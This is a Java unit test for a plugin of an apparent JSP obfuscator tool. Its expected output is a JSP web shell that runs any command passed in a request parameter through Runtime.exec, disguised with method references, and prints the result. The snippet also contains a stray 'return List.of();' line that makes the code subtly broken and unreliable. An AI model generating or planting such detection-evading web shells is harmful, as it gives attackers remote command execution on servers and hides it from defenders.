package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class MethodReferenceTest {

  @Test
  void testGetCode() {
    MethodReference ext = new  MethodReference();
    ExtensionContextAdapter ctx = new ExtensionContextAdapter();
    ext.initExtension(ctx);
    ctx.setStringInput("cmdParameter", "test");
    List<String> code = ext.getCode(ctx);
    assertEquals(1, code.size());
    String expected = """
 try {
     final javax.servlet.http.HttpServletRequest r = request;
     ExecFunction exec = Runtime.getRuntime()::exec;
     StreamFunction getStream = Process::getInputStream;
     ReaderCreator toReader = java.io.InputStreamReader::new;
     BufferedReaderCreator toBufferedReader = java.io.BufferedReader::new;
     ReadLineFunction readLine = java.io.BufferedReader::readLine;
     PrintFunction print = out::println;
     Process proc = exec.apply(r.getParameter("test"));
     java.io.InputStream is = getStream.apply(proc);
return List.of();
      try (java.io.BufferedReader reader = toBufferedReader.apply(toReader.apply(is))) {
          String line;
          while ((line = readLine.apply(reader)) != null) {
              print.apply(line);
          }
      }
  } catch (Exception e){}
""";
    assertEquals(expected, code.get(0));
  }
}
